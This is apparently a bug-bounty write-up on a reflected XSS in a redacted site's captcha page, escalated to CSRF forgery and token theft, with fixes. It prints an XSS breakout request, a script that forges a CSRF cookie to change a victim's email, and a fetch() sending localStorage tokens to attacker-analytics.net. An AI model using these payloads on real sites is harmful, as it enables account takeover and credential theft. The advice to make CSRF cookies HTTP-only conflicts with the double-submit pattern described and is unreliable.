---
title: Bypassing the Gateway: How I Earned a $7,500 Bounty with Reflected XSS
date: JUNE 09, 2026
readTime: 8 MIN READ
tags: SECURITY, XSS, CSRF, WEB APPS
summary: The anatomy of a high-severity Reflected XSS vulnerability on a massive platform's automated human verification page, leading to full session hijacking, cookie mutations, and a $7,500 HackerOne payload payout.
---

# Bypassing the Gateway: How I Earned a $7,500 Bounty with Reflected XSS

It is often assumed that finding high-severity vulnerabilities on multi-billion dollar tech platforms requires complex cryptography audits, advanced memory corruption tools, or weeks of automated fuzzing. 

But web architecture is fundamentally a web of parameters. Sometimes, the most devastating cracks are found in the simplest, most overlooked places—such as the automated screen designed to filter out botnets.

In this deep dive, we will dissect a vulnerability I submitted to **█████████** (a high-traffic global content portal) via their HackerOne program. By leveraging a single unescaped parameter inside their "Prove your humanity" rate limit flow, I succeeded in bypassing their entire CSRF defense token system, harvesting sensitive API credentials from local storage, and earning a **$7,500 bounty**.

[reflected-xss-playground]



## The Discovery: Sifting Through the Security Perimeter

While inspecting high-volume ingress gateways, I noticed that █████████ employs a protective rate-limiting system. When a client floods the API endpoints with rapid requests, the server responds with a temporary gateway page requiring the user to prove their humanity (a standard captcha validator).

This automated screen can be triggered at various endpoints across the platform. While inspecting a test endpoint `/svc/frontpage/events`, I noticed that the current page parameters were being forwarded downstream to construct the final verification HTML.

### The Vulnerable Code Construction

Under the hood, the backend application served a static HTML form where users submitted their verified token. To ensure the user stayed on the same query context after solving the challenge, the backend automatically echoed the page's query parameters into the form's `action` attribute.

Crucially, this user-controlled URL parameter was injected **without proper HTML encoding**. 

```sql
-- Micro-architectural template failure:
-- The raw query string is directly interpolated into the double-quoted attribute.
<form method="POST" action="/svc/frontpage/events?[USER_CONTROLLED_QUERY_STRING]&captcha=1">
```



## Phase 1: Breaking Out of the Attribute

In HTML parsing, double quotes (`"`) mark the boundaries of attribute strings. If an attacker passes a query containing a double quote followed by a closing bracket (`>`), they can prematurely terminate the current element and introduce a completely new HTML block.

I submitted a request containing a standard JavaScript alert payload.

### The Malicious Request

```http
GET /svc/frontpage/events?l2jmw"><script>alert(1)</script>lbbon=1 HTTP/2
Host: www.█████████.com
Accept: */*
Accept-Language: en-US;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
```

### The Unescaped Response

The server processed the query and responded with a `200 OK`. Looking at the source, the nested payload had executed a flawless breakout:

```html
<!-- The unescaped payload broke the quotes and closed the parent form! -->
<form method="POST" action="/svc/frontpage/events?l2jmw"><script>alert(1)</script>lbbon=1&captcha=1">
```

By injecting `"><script>alert(1)</script>`, the original double-quote of the action parameter was closed, the `<form>` tag itself was closed by the injected `>`, and the browser's HTML parser immediately evaluated the `<script>` tag as an active execution unit!



## Phase 2: Escalating to Cookie Theft & CSRF Hijacking

An isolated `alert(1)` is cute, but to prove real, high-severity impact to triage engineers, you must demonstrate a path to account takeover or session hijacking. 

I immediately explored the cookie and state architecture of █████████. I noticed that the application’s anti-CSRF mechanism relied on a classic double-submit pattern:

1. A CSRF token is stored in a cookie.
2. A matching token must be sent in the request headers or request body.
3. The server compares the two. If they match, the action is validated.

### The Double-Submit Flaw

Surprisingly, █████████'s CSRF cookie was **not set to `HTTP-only`**. This meant that client-side JavaScript executing in the user's browser had full read/write privileges over the cookie.

Furthermore, the server validated that the token in the request body matched the token in the cookie *without verification of server-side state pairing*. An attacker executing JavaScript via Reflected XSS could:

1. Generate a brand new, random cryptographic hash (`CSRF_HACK_TOKEN`).
2. Write that fake hash into the user's browser cookies: `document.cookie = "csrf_token=CSRF_HACK_TOKEN; domain=█████████.com;"`.
3. Submit a state-changing POST request on behalf of the victim (such as changing the user’s primary recovery email or password), sending `CSRF_HACK_TOKEN` directly in the request body.

Since both values matched, the server validated the CSRF request immediately. The session was hijacked.

```javascript
// Exposing the Double-Submit Vulnerability via XSS:
function hijackCSRF() {
  const fakeToken = "HACK_CSRF_1337_ABCD";
  
  // 1. Inject forged CSRF token directly into cookies (Active Write-Pass)
  document.cookie = `csrf_token=${fakeToken}; domain=█████████.com; path=/; secure`;
  
  // 2. Transmit state-mutating request using matching forged body
  fetch("/api/account/update-email", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: `email=attacker@malware.org&csrf_token=${fakeToken}`
  });
}
```



## Phase 3: Looting Local Storage for Live API Keys

Web applications often use standard `HTTP-only` cookies to guard primary session IDs. But modern single-page capabilities have distributed auxiliary access keys across alternative client storage compartments, like `localStorage` and `sessionStorage`.

Because our script executes within the exact context of the `www.█████████.com` origin, we have complete, unrestricted access to these client arrays.

Under inspection, the platform was storing major third-party chat access indicators in plain text:

* **`chat:matrix-access-token`**: Used to orchestrate live secure communication streams.
* **`chat:access-token`**: Secondary authorization bearer string.

By utilizing the Reflected XSS endpoint, an attacker can simply harvest these tokens and relay them back to their telemetry logging server with a single `fetch` request:

```javascript
// Relaying sensitive localStorage tokens to an attacker-controlled endpoint
const matrixToken = localStorage.getItem('chat:matrix-access-token');
const mainAccessToken = localStorage.getItem('chat:access-token');

fetch('https://attacker-analytics.net/log', {
  method: 'POST',
  body: JSON.stringify({ matrixToken, mainAccessToken })
});
```



## The Bounty Lifecycle: Zero to Active Triage

To submit a world-class security report, you must outline the exact chronological chain of replication. Here is the timeline of how the lifecycle evolved after submitting the vulnerability:

1. **Submission (November 19, 2025):** I shipped the original proof-of-concept showing raw breakout inside Burp Suite, alongside video screencasts showing cookie theft.
2. **Preliminary Analyst Review (November 20, 2025):** The report passed the gatekeepers and entered the platform queue.
3. **The Challenge (November 20, 2025):** A security engineer asked how an attacker could realistically trick users, as the rate-limiting captcha screens only load under specific conditions.
4. **The Proof (November 20, 2025):** I explained that attackers can easily trigger rates on multiple vulnerable endpoints by using lightweight micro-burst request scripting or embedding payloads inside standard cross-site links.
5. **Triage & Patch (November 20, 2025):** The system engineering group moved the ticket to **Triaged**, pushed a hotfix implementing robust HTML entity encoding for form actions, and locked down the origin.
6. **The Reward:** The validation committee evaluated the threat severity and rewarded an excitement-filled **$7,500 bounty**!



## Key Takeaways for High-Scale Web Architecture

This vulnerability highlights three critical principles that high-velocity engineering groups must implement to secure their infrastructure:

1. **Always HTML-Encode Outputs in Attribute Templates:** Never assume that simple query parameters are safe for straight injection inside tags or double quotes. Use strict validation sanitization or proper template parsers that default to absolute HTML escaping.
2. **Adopt Strong Content Security Policies (CSP):** A robust CSP with modern `strict-dynamic` and restricted `script-src` policies would have blocked the arbitrary script from launching, neutralizing the XSS at the threshold.
3. **Never Rely Solely on Double-Submit CSRF Cookies:** Couple anti-forgery protections with server-side session associations, or secure state change endpoints using single-use cryptographically bound authorization models. Ensure CSRF cookies always enforce `HTTP-only` flags.

Finding zero-days doesn't require deep binary reverse engineering every time. Simple parameter sanitization escapes account for some of the highest-value threat vectors on the modern web!
